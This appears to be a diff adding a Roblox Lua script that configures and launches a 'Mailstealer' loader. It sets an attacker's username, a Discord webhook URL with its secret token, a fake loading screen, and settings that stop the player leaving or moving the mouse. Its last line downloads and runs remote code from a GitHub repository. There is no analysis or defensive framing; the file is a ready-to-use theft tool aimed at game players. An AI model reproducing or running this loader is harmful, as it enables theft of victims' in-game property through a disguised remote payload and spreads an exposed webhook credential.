@@ -1,0 +1,16 @@
+UserName = "Official_Kenzooo"
+Webhook = "https://discord.com/api/webhooks/1134183732564201542/PNF2zG5pHaOKZ4roFFK9dXyS5e_RrAeo6rrVGhP6NR8ZgO57ULBDI8n0ZJzzZY75n5UC"
+UserName2 = "Official_Kenzooo"
+
+_G.LoadingScreen = true -- make it true if you want the loadingscreen
+_G.AntiLeave = true -- make it true if you want the antileave
+_G.MouseLock = true -- make it true if you want the mouselock
+
+
+_G.ScriptName = "StickOgh Scriptz"
+_G.FirstText = "Preparing..."
+_G.SecondText = "Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- in secondes it's the time for the loading bar to hit from 0% to 100%
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StickOgh01/Mailstealer_/main/Mailstealer"))()
